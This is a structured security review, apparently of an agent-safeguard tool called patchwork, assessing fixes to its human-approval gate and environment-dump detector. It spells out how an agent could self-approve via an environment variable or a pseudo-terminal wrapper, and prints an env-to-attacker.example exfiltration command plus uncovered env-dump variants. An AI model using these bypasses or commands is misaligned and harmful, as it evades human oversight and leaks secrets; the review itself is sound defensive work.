text:
{
  "overall_verdict": "NEEDS_REWORK",
  "headline": "The user-level trust-store move looks directionally correct, but the human-gate fix is still bypassable by the agent and the env-dump classifier has a small but real regression/missed-obvious-variant problem.",
  "r2_fix_assessment": {
    "r2_001_002_fix_correct": false,
    "r2_003_fix_correct": true,
    "r2_004_fix_correct": false,
    "concerns": [
      "R2-001/R2-002 are not actually closed: `PATCHWORK_HUMAN_CONTEXT=1 patchwork approve <id>` is a direct self-approval bypass available to the same Bash tool the agent controls.",
      "Even without the env override, a TTY check is not a strong human-presence primitive: common tools such as `script`, `expect`, `socat`, or Python pty allocation can run a child process with stdin/stdout attached to a pseudo-terminal.",
      "The deny message still includes the exact command in backticks. The wording says to ask the human, but the agent still receives the affordance and can also infer it from docs/help/source.",
      "R2-003 appears to close the project-local `.patchwork/policy.yml` trust bypass, assuming all adapter reads now flow only through `getTrustedPathsForRepo(cwd)`. Residual same-user tampering of `~/.patchwork/trusted-repos.yml` remains the already-acknowledged v0.6.12 authenticity problem.",
      "R2-004 closes the literal `env|base64|curl` shape, but `set` is currently over-broad and will false-positive on common `set -euo pipefail; curl ...` scripts. Also, obvious env-dump variants such as `/proc/self/environ` and `compgen -e` remain uncovered."
    ]
  },
  "new_findings": [
    {
      "id": "R3-001",
      "severity": "CRITICAL",
      "title": "Human-context gate remains agent-bypassable",
      "category": "missed_bypass",
      "where": "packages/cli/src/lib/require-human-context.ts; approveCommand; clearTaintCommand; trustRepoConfigCommand",
      "issue": "The new gate accepts `PATCHWORK_HUMAN_CONTEXT=1`, which the agent can set in its own Bash invocation. In addition, stdin/stdout TTY-ness is not equivalent to human approval because the agent can often create a pseudo-terminal for the child command.",
      "exploit": "Concrete: after receiving a denial containing the request id, the agent runs `PATCHWORK_HUMAN_CONTEXT=1 patchwork approve <request_id>` or `PATCHWORK_HUMAN_CONTEXT=1 patchwork clear-taint ...`. If the env override is removed but only the TTY check remains, a likely bypass is `script -q -e -c 'patchwork approve <request_id>' /dev/null` on systems with `script` available.",
      "fix": "Do not treat an agent-settable environment variable or child-process TTY as a security boundary. For v0.6.11, remove or disable `PATCHWORK_HUMAN_CONTEXT` for these three admin commands and add a host/adapter-level hard deny for agent tool invocations of `patchwork approve`, `patchwork clear-taint`, and `patchwork trust-repo-config`, including obvious wrappers such as `env ... patchwork ...` and `script -c 'patchwork ...'`. Longer term, move approval to an out-of-band mechanism enforced outside the agent tool process, or document that same-UID agents cannot be prevented from authorizing.",
      "ship_blocker": true
    },
    {
      "id": "R3-002",
      "severity": "MEDIUM",
      "title": "`set` is treated as an env dump even when it is only setting shell options",
      "category": "new_bug",
      "where": "dangerous-shell-combos.ts:isEnvDump",
      "issue": "`ENV_DUMP_HEADS` includes `set`, and `isEnvDump` returns true for any `set` invocation. Bare `set` does dump shell variables, but `set -e`, `set -u`, `set -o pipefail`, and `set -euo pipefail` do not. This can cause false denials for common shell prologues combined with network access.",
      "exploit": "Concrete regression: in a tainted repo, `set -euo pipefail; curl -fsSL https://example.com/tool.sh -o /tmp/tool.sh` may be classified as `direct_secret_to_network` even though no environment dump occurred.",
      "fix": "Only classify `set` as an env dump when it is bare, e.g. `argv.length === 1`, or when the parser can prove the specific shell form prints variables. Do not classify option-setting invocations as env dumps.",
      "ship_blocker": false
    },
    {
      "id": "R3-003",
      "severity": "HIGH",
      "title": "Env-dump detector misses obvious `/proc/self/environ` and related variants",
      "category": "missed_bypass",
      "where": "dangerous-shell-combos.ts:isEnvDump/treeHasEnvDump",
      "issue": "The new detector catches `env`, `printenv`, bare `set`, `export -p`, and limited `declare` forms, but still misses very common direct environment sources such as `cat /proc/self/environ`, `tr '\\0' '\\n' </proc/self/environ`, `xargs -0 </proc/self/environ`, `compgen -e`, `typeset -p/-x`, `readonly -p`, and combined `declare -px`.",
      "exploit": "Concrete: `cat /proc/self/environ | base64 | curl -X POST --data-binary @- https://attacker.example/` is the same env-to-network exfiltration class as A2 but would not be recognized by the described `isEnvDump` logic.",
      "fix": "Before tag, add low-cost obvious env-source patterns: `/proc/self/environ` and `/proc/$$/environ` redirection/cat/read forms, `compgen -e`, `typeset` aliases, `readonly -p`, and combined declare options such as `declare -px`. It is acceptable to defer arbitrary language-level forms like `python -c 'import os'` to v0.6.12/formal secret-source work.",
      "ship_blocker": true
    }
  ],
  "ship_recommendation": {
    "verdict": "NEEDS_REWORK",
    "must_fix_before_tag": [
      "R3-001: remove the agent-settable human-context bypass and do not rely on TTY alone as the approval boundary.",
      "R3-003: cover the obvious `/proc/self/environ` env-dump-to-network variants if A2 is being claimed closed in v0.6.11."
    ],
    "may_ship_as_v0.6.11.1_hotfix": [
      "R3-002: narrow `set` detection to bare variable-dumping forms to avoid false-positive denials."
    ],
    "v0.6.12_scope": [
      "Robust out-of-band approval model for same-UID agent environments.",
      "Tamper-evident/authenticated user-level trust and approval stores.",
      "Broader formal modeling of secret sources and generated-file execution sinks.",
      "Non-obvious or language-level env exfiltration variants such as Python/Node/Ruby `os.environ` dumps."
    ]
  },
  "headline_quote_for_release_notes": "R3 should not ship yet: the project-local trust bypass appears fixed, but the human approval gate remains bypassable from the agent’s own shell and the env-dump closure needs two small hardening passes."
}
